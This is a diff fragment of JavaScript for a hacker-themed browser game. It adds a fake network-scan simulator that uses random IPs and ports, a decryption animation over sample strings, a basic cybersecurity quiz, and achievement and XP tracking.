+  if (state.missionsCompleted >= 3) unlockAchievement('mission3');
+  if (state.missionsCompleted >= MISSIONS.length) unlockAchievement('all_missions');
+}
+
+function addMissionLog(msg) {
+  const now = new Date().toTimeString().split(' ')[0];
+  state.missionLog.unshift(`[${now}] ${msg}`);
+  const log = document.getElementById('mission-log');
+  if (log) {
+    log.innerHTML = state.missionLog.slice(0,10).map(l =>
+      `<div style="border-bottom:1px solid rgba(0,255,65,0.05);padding:1px 0;">${l}</div>`
+    ).join('');
+  }
+}
+
+// ============================================================
+// NETWORK SCAN SIMULATOR
+// ============================================================
+let scanRunning = false;
+const FAKE_IPS = () => Array.from({length: Math.floor(4+Math.random()*8)}, (_,i) =>
+  `192.168.${Math.floor(Math.random()*5)}.${Math.floor(Math.random()*254)+1}`
+);
+
+function startScan() {
+  if (scanRunning) return;
+  scanRunning = true;
+  const btn = document.getElementById('scan-btn');
+  const output = document.getElementById('scan-output');
+  const prog = document.getElementById('scan-prog');
+  btn.disabled = true; btn.textContent = '⏳ SCANNING...';
+  output.innerHTML = '';
+  prog.style.width = '0%';
+  playBeep();
+
+  const type = document.getElementById('scan-type').value;
+  const target = document.getElementById('scan-target').value;
+  const ips = FAKE_IPS();
+  const total = ips.length;
+  let done = 0;
+
+  addScanLine(`<span style="color:var(--neon2)">Starting ${type.toUpperCase()} scan on ${target}...</span>`);
+  addScanLine(`<span style="color:var(--text-dim)">Sending probes [SIMULATION ONLY]...</span>`);
+
+  ips.forEach((ip, idx) => {
+    setTimeout(() => {
+      addScanLine(`<span class="scan-ip">[${(idx+1).toString().padStart(2,'0')}]</span> Probing <span class="scan-ip">${ip}</span>...`);
+      const ports = [22, 80, 443, 8080, 3306, 21];
+      ports.forEach((p, pi) => {
+        setTimeout(() => {
+          const open = Math.random() > 0.55;
+          addScanLine(`   └─ Port <span class="${open?'scan-port-open':'scan-port-closed'}">${p}</span> ${open?'[OPEN]':'[CLOSED]'} ${open?getServiceName(p):''}`);
+        }, pi * 80);
+      });
+      done++;
+      prog.style.width = (done / total * 100) + '%';
+      if (done >= total) {
+        setTimeout(() => {
+          addScanLine(`<span style="color:var(--neon)">✓ Scan complete. ${total} hosts scanned.</span>`);
+          btn.disabled = false; btn.textContent = '▶ START SCAN';
+          scanRunning = false;
+          state.hacks++;
+          addXP(25, 'Network scan');
+          addScanHistory(type, target, total);
+          unlockAchievement('first_scan');
+          playSuccess();
+        }, 600);
+      }
+    }, idx * 500 + 300);
+  });
+}
+
+function addScanLine(html) {
+  const out = document.getElementById('scan-output');
+  const d = document.createElement('div');
+  d.className = 'scan-line';
+  d.innerHTML = html;
+  out.appendChild(d);
+  out.scrollTop = out.scrollHeight;
+}
+
+function addScanHistory(type, target, hosts) {
+  const now = new Date().toTimeString().split(' ')[0];
+  state.scanHistory.unshift({time:now, type, target, hosts});
+  const hist = document.getElementById('scan-history');
+  if (hist) {
+    hist.innerHTML = state.scanHistory.map(s =>
+      `<div style="border-bottom:1px solid rgba(0,255,65,0.05);padding:2px 0;">[${s.time}] ${s.type.toUpperCase()} → ${s.target} (${s.hosts} hosts)</div>`
+    ).join('');
+  }
+}
+
+// ============================================================
+// DECRYPTION SIMULATOR
+// ============================================================
+const ENCRYPTED_SAMPLES = [
+  {cipher:'caesar',enc:'KHOOR ZRUOG',dec:'HELLO WORLD'},
+  {cipher:'base64',enc:'SGFja2luZyBPUw==',dec:'Hacking OS'},
+  {cipher:'hex',enc:'48 61 63 6B 65 72',dec:'Hacker'},
+  {cipher:'binary',enc:'01001000 01001001',dec:'HI'},
+  {cipher:'custom',enc:'!@#$%^&*()_+',dec:'CLASSIFIED_DATA'},
+];
+
+const CIPHER_INFO = {
+  caesar:'Caesar cipher shifts each letter by a fixed number of positions. One of the oldest encryption methods, used by Julius Caesar.',
+  base64:'Base64 encoding converts binary data to ASCII text. Commonly used for data transmission.',
+  hex:'Hexadecimal encoding represents data using base-16 numbers (0-9, A-F).',
+  binary:'Binary encoding represents data as sequences of 0s and 1s.',
+  custom:'Custom cipher uses proprietary substitution algorithms. Keys are system-generated.',
+};
+
+let decryptRunning = false;
+
+function startDecrypt() {
+  if (decryptRunning) return;
+  decryptRunning = true;
+  const btn = document.getElementById('decrypt-btn');
+  const display = document.getElementById('decrypt-display');
+  const fill = document.getElementById('decrypt-fill');
+  const status = document.getElementById('decrypt-status');
+  const pct = document.getElementById('decrypt-pct');
+  const result = document.getElementById('decrypt-result');
+  const cipherType = document.getElementById('cipher-type').value;
+
+  const sample = ENCRYPTED_SAMPLES.find(s => s.cipher === cipherType) || ENCRYPTED_SAMPLES[0];
+  btn.disabled = true;
+  result.innerHTML = '';
+  playBeep();
+
+  let progress = 0;
+  display.innerHTML = `<span style="color:var(--neon3)">${sample.enc}</span>`;
+
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$';
+  const interval = setInterval(() => {
+    progress += 2 + Math.random() * 3;
+    if (progress > 100) progress = 100;
+    fill.style.width = progress + '%';
+    pct.textContent = Math.floor(progress) + '%';
+    status.textContent = 'STATUS: ' + (progress < 30 ? 'ANALYZING' : progress < 60 ? 'BREAKING' : progress < 90 ? 'EXTRACTING' : 'FINALIZING');
+
+    const ratio = progress / 100;
+    const scrambled = sample.dec.split('').map((c, i) =>
+      i < Math.floor(sample.dec.length * ratio) ? c : chars[Math.floor(Math.random()*chars.length)]
+    ).join('');
+    display.innerHTML = `<span style="color:${ratio > 0.9 ? 'var(--neon)' : 'var(--neon3)'}">${scrambled}</span>`;
+
+    if (progress >= 100) {
+      clearInterval(interval);
+      display.innerHTML = `<span style="color:var(--neon)">${sample.dec}</span>`;
+      result.style.cssText = 'border-color:var(--neon);background:rgba(0,255,65,0.05);';
+      result.innerHTML = `✓ DECRYPTED: <span style="color:var(--neon)">${sample.dec}</span>`;
+      btn.disabled = false;
+      decryptRunning = false;
+      state.decrypts++;
+      addXP(30, 'Decryption');
+      addDecryptLog(cipherType, sample.enc, sample.dec);
+      playSuccess();
+      if (state.decrypts >= 5) unlockAchievement('decrypt5');
+    }
+  }, 80);
+}
+
+document.addEventListener('DOMContentLoaded', () => {});
+
+function addDecryptLog(type, enc, dec) {
+  const now = new Date().toTimeString().split(' ')[0];
+  state.decryptLog.unshift({time:now, type, enc, dec});
+  const log = document.getElementById('decrypt-log');
+  if (log) {
+    log.innerHTML = state.decryptLog.map(d =>
+      `<div style="border-bottom:1px solid rgba(0,255,65,0.05);padding:2px 0;">[${d.time}] ${d.type.toUpperCase()}: ${d.enc} → <span style="color:var(--neon)">${d.dec}</span></div>`
+    ).join('');
+  }
+}
+
+// Update cipher info on select change
+function updateCipherInfo() {
+  const type = document.getElementById('cipher-type').value;
+  const info = document.getElementById('cipher-info');
+  if (info) info.textContent = CIPHER_INFO[type] || '';
+}
+
+// ============================================================
+// QUIZ SYSTEM
+// ============================================================
+const QUESTIONS = [
+  {q:'What does "SQL Injection" refer to?',opts:['A database engine','Inserting malicious SQL code into input fields','A type of network protocol','A firewall bypass technique'],ans:1},
+  {q:'What does "HTTPS" stand for?',opts:['Hyper Transfer Protocol Secure','HyperText Transfer Protocol Secure','Hyper Text Tracking Protocol System','High Transfer Protocol Standard'],ans:1},
+  {q:'Which protocol is used for secure remote login?',opts:['FTP','Telnet','SSH','SMTP'],ans:2},
+  {q:'What is a "Zero-Day" vulnerability?',opts:['A bug fixed on day zero','An unknown flaw with no available patch','A scheduled maintenance window','A 24-hour DDoS attack'],ans:1},
+  {q:'What does "DDoS" stand for?',opts:['Direct Denial of Service','Distributed Denial of Service','Data Deletion on Servers','Distributed Data on Systems'],ans:1},
+  {q:'What is "Phishing"?',opts:['A network scanning technique','Tricking users to reveal sensitive info via fake communications','Encrypting database records','Port scanning methodology'],ans:1},
+  {q:'What does a "Firewall" primarily do?',opts:['Speeds up internet connection','Monitors and controls network traffic','Encrypts hard drive data','Backs up system files'],ans:1},
+  {q:'What is "Two-Factor Authentication"?',opts:['Two passwords for one account','Using two different browsers','Verifying identity with two separate methods','Encrypting data twice'],ans:2},
+  {q:'What does "VPN" stand for?',opts:['Very Private Network','Virtual Protected Node','Virtual Private Network','Verified Proxy Network'],ans:2},
+  {q:'What is "Malware"?',opts:['A type of hardware failure','Software designed to harm systems','A network topology','An encryption standard'],ans:1},
+];
+
+let quizIdx = 0, quizScore = 0, quizAnswered = false;
+
+function loadQuestion() {
+  if (quizIdx >= QUESTIONS.length) { showQuizEnd(); return; }
+  const q = QUESTIONS[quizIdx];
+  document.getElementById('quiz-q-num').textContent = `QUESTION ${quizIdx+1} / ${QUESTIONS.length}`;
+  document.getElementById('quiz-q').textContent = q.q;
+  document.getElementById('quiz-feedback').textContent = '';
+  document.getElementById('quiz-next').style.display = 'none';
+  quizAnswered = false;
+  const opts = document.getElementById('quiz-opts');
+  opts.innerHTML = '';
+  q.opts.forEach((o, i) => {
+    const btn = document.createElement('button');
+    btn.className = 'quiz-opt';
+    btn.textContent = String.fromCharCode(65+i) + '. ' + o;
+    btn.onclick = () => answerQuiz(i, q.ans);
+    opts.appendChild(btn);
+  });
+}
+
+function answerQuiz(chosen, correct) {
+  if (quizAnswered) return;
+  quizAnswered = true;
+  const btns = document.querySelectorAll('.quiz-opt');
+  btns.forEach((b, i) => {
+    b.disabled = true;
+    if (i === correct) b.classList.add('correct');
+    if (i === chosen && chosen !== correct) b.classList.add('wrong');
+  });
+  const fb = document.getElementById('quiz-feedback');
+  if (chosen === correct) {
+    quizScore++;
+    state.quizStreak++;
+    state.quizCorrect++;
+    fb.innerHTML = '<span style="color:var(--neon)">✓ CORRECT! +10 XP</span>';
+    addXP(10, 'Quiz correct answer');
+    playSuccess();
+    if (state.quizStreak > state.quizBestStreak) state.quizBestStreak = state.quizStreak;
+    if (state.quizStreak >= 5) unlockAchievement('streak5');
+  } else {
+    state.quizStreak = 0;
+    state.quizWrong++;
+    fb.innerHTML = '<span style="color:#ff5f56">✗ INCORRECT</span>';
+    playError();
+  }
+  document.getElementById('q-streak').textContent = state.quizStreak;
+  document.getElementById('q-best').textContent = state.quizBestStreak;
+  document.getElementById('q-correct').textContent = state.quizCorrect;
+  document.getElementById('q-wrong').textContent = state.quizWrong;
+  document.getElementById('quiz-next').style.display = 'block';
+}
+
+function nextQuestion() {
+  quizIdx++;
+  loadQuestion();
+  playClick();
+}
+
+function showQuizEnd() {
+  document.getElementById('quiz-container').style.display = 'none';
+  document.getElementById('quiz-end').style.display = 'block';
+  document.getElementById('quiz-final-score').textContent = quizScore + '/10';
+  const grade = quizScore >= 9 ? '🏆 ELITE HACKER' : quizScore >= 7 ? '⭐ SKILLED OPERATOR' : quizScore >= 5 ? '👍 DECENT' : '💀 NEEDS PRACTICE';
+  document.getElementById('quiz-grade').innerHTML = `<span style="color:${quizScore>=7?'var(--neon)':'#ffbd2e'}">${grade}</span>`;
+  state.quizHistory.push(quizScore + '/10');
+  const hist = document.getElementById('quiz-history');
+  if (hist) hist.innerHTML = state.quizHistory.map((s,i) => `<div>Run #${i+1}: ${s}</div>`).join('');
+  addXP(quizScore * 15, 'Quiz completed');
+  if (quizScore === 10) unlockAchievement('quiz_perfect');
+  playSuccess();
+}
+
+function restartQuiz() {
+  quizIdx = 0; quizScore = 0; quizAnswered = false;
+  document.getElementById('quiz-container').style.display = 'block';
+  document.getElementById('quiz-end').style.display = 'none';
+  loadQuestion();
+  playClick();
+}
+
+// ============================================================
+// ACHIEVEMENTS
+// ============================================================
+function unlockAchievement(id) {
+  if (state.achievements.has(id)) return;
+  state.achievements.add(id);
+  const ach = ACHIEVEMENTS.find(a => a.id === id);
+  if (!ach) return;
+  showToast(ach.icon + ' Achievement: ' + ach.name);
+  playSuccess();
+  addActivity('Achievement: ' + ach.name);
+  renderAchievements();
+}
+
+function checkAchievements() {
+  if (state.hacks >= 1) unlockAchievement('first_scan');
+  if (state.decrypts >= 5) unlockAchievement('decrypt5');
+  if (state.missionsCompleted >= 3) unlockAchievement('mission3');
+  if (state.level >= 5) unlockAchievement('level5');
+  const h = new Date().getHours();
+  if (h >= 22 || h < 4) unlockAchievement('night_owl');
+}
+
+function renderAchievements() {
+  const grid = document.getElementById('ach-grid');
+  if (!grid) return;
+  grid.innerHTML = ACHIEVEMENTS.map(a => `
+    <div class="ach-item ${state.achievements.has(a.id) ? 'unlocked' : 'locked'}">
+      <div class="ach-icon">${a.icon}</div>
+      <div class="ach-name">${a.name}</div>
+    </div>
+  `).join('');
+
+  const rankList = document.getElementById('rank-list');
+  if (rankList) {
+    rankList.innerHTML = RANKS.map((r, i) => {
+      const reached = state.xp >= r.xp;
+      return `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(0,255,65,0.05);">
+        <span style="color:${reached?'var(--neon)':'var(--text-dim)'};">${reached?'✓':' '} ${r.name}</span>
+        <span style="font-size:10px;color:var(--text-dim);">${r.xp} XP</span>
+      </div>`;
+    }).join('');
+  }
+}
+
+// ============================================================
+// CIPHER SELECT HANDLER
+// ============================================================
+function setupCipherSelect() {
+  const sel = document.getElementById('cipher-type');
+  if (sel) sel.addEventListener('change', updateCipherInfo);
+  updateCipherInfo();
+}
+
+// ============================================================
 // INIT
-// ═══════════════════════════════════════════
-function initDashboard() {
-  document.getElementById('cpu-val').textContent = '16';
-  document.getElementById('thread-val').textContent = '32';
-  document.getElementById('procs-val').textContent = '247';
-  document.getElementById('packets-val').textContent = '3812';
-
-  initDecryptMatrix();
-  initFwBars();
-  initExploits();
-  
-  addLog('sys', 'HackingOS v1.0 initialized — Tor circuit active');
-  addLog('info', 'Starting automated reconnaissance...');
-
-  autoLogInterval = setInterval(autoLog, 800 + Math.random() * 400);
-  setInterval(updateStats, 500);
-  setInterval(updateDecryptChars, 120);
-  setInterval(updateFwBars, 300);
-
-  // auto type demo
-  setTimeout(startTyping, 2000);
+// ============================================================
+function initApp() {
+  buildMissions();
+  buildMiniMap();
+  loadQuestion();
+  renderAchievements();
+  setupCipherSelect();
+  updateProfile();
+  addActivity('System boot complete');
+  addActivity('Welcome, GHOST_X');
+  checkAchievements();
+  // Start periodic activity updates
   setInterval(() => {
-    if (Date.now() - lastInteract > 5000) startTyping();
+    const msgs = [
+      'Port scan detected on VPN',
+      'Encrypted traffic analyzed',
+      'Firewall rules updated',
+      'Stealth mode active',
+      'Proxy chain refreshed',
+    ];
+    // silently update stats
+    animateStats();
   }, 5000);
 }
 </script>
 </body>
-</html>
+  </html>
